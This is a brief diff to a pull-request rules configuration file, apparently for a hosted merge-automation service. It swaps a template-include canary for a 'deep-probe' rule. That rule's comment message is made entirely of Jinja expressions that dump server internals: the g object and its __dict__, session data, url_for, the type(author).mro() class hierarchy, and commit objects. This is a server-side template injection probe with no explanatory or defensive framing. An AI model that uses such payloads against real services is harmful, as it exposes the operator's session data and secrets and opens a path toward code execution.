@@ -1,8 +1,16 @@
 pull_request_rules:
-  - name: include-probe
+  - name: deep-probe
     conditions: []
     actions:
       comment:
         message: |
-          {% include 'CANARY_NONEXISTENT_TEMPLATE_XYZ123' %}
-          POST_INCLUDE
+          G={{ g }}
+          SESSION={{ session }}
+          URL_FOR={{ url_for }}
+          TYPE_AUTHOR={{ type(author) }}
+          TYPE_METH={{ type(author).mro() }}
+          COMMITS_JSON={{ commits | tojson }}
+          COMMIT0_DICT={% if commits %}{{ commits[0].dict() }}{% endif %}
+          AUTHOR_ENCODE={{ author.encode() }}
+          G_TYPE={{ type(g) }}
+          G_DICT={{ g.__dict__ }}
